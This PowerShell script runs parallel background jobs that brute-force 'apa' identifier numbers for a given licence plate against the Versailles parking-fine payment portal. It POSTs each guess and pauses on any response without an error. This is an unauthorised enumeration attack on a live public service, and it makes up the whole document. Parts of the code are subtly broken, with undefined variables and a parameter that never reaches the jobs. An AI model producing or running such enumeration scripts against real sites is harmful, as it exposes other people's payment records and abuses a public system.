[CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="immatriculation")]
        [string]$immatriculation
)

Get-Content ".\number.txt" | %{

  $ScriptBlock = {
    # accept the loop variable across the job-context barrier
    param($name) 
    # Show the loop variable has made it through!
    Write-Host "[processing '$name' inside the job]"
    $tmpnb = $name -split ';'
    $apa = [int64]$tmpnb[0]
    $fin = [int64]$tmpnb[1]
    # Execute a command

    while ($apa -ne $fin)
    {
        $lineBody = "immatriculation=$immatriculation&apa=$apa"
        $responseFromServer = Invoke-WebRequest -Uri "https://paiementenligne.versailles.fr/fps/" -Body $lineBody -Method Post

        if ($responseFromServer -notmatch '<strong>Erreur')
        {
            Write-Host "OK $apa"
            Read-Host
        }
        if (($apa % 100) -eq 0)
        {
            Write-Host "[CHECK]" $apa $apastring.Length
        }
        $apa++
    }
  }

  # Show the loop variable here is correct
  Write-Host "processing $_..."

  # pass the loop variable across the job-context barrier
  Start-Job $ScriptBlock -ArgumentList $_
}

$job = Get-Job
while($job.State -eq 'Running')
{
    $sync.Keys | Foreach-Object {
        # If key is not defined, ignore
        if(![string]::IsNullOrEmpty($sync.$_.keys))
        {
            # Create parameter hashtable to splat
            $param = $sync.$_

            # Execute Write-Progress
            Write-Progress @param
        }
    }

    # Wait to refresh to not overload gui
    Start-Sleep -Seconds 10
}

Get-Job | Receive-Job